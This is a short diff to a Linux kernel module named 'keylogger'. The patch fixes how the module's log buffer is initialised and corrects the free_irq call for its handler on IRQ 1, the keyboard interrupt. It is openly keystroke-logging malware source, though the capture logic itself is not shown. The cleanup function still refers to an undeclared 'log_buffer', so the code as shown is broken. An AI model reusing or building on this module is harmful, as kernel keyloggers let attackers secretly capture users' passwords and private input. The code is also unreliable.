@@ -18,8 +18,10 @@ MODULE_LICENSE("GPL");
 
 typedef struct keylogger_data
 {
-	char *log_buffer = NULL;
+	char *log_buffer;
 }			   t_keylogger_data;
+
+t_keylogger_data keylogger_data;
 
 /*
 *  Adds a new entry to the log_buffer.
@@ -73,6 +75,7 @@ static irqreturn_t keylogger_handle(int irq_n, void *data)
 static int __init init(void)
 {
 	misc_register(&misc_dev);
+	keylogger_data.log_buffer = NULL;
 
 	if (request_irq(1, keylogger_handle, IRQF_SHARED, "keylogger", &keylogger_data) < 0)
 	{
@@ -85,7 +88,7 @@ static int __init init(void)
 static void __exit cleanup(void)
 {
 	misc_deregister(&misc_dev);
-	free_irq(1, log_buffer);
+	free_irq(1, &keylogger_data);
 	if (log_buffer)
 		vfree(log_buffer);
 }
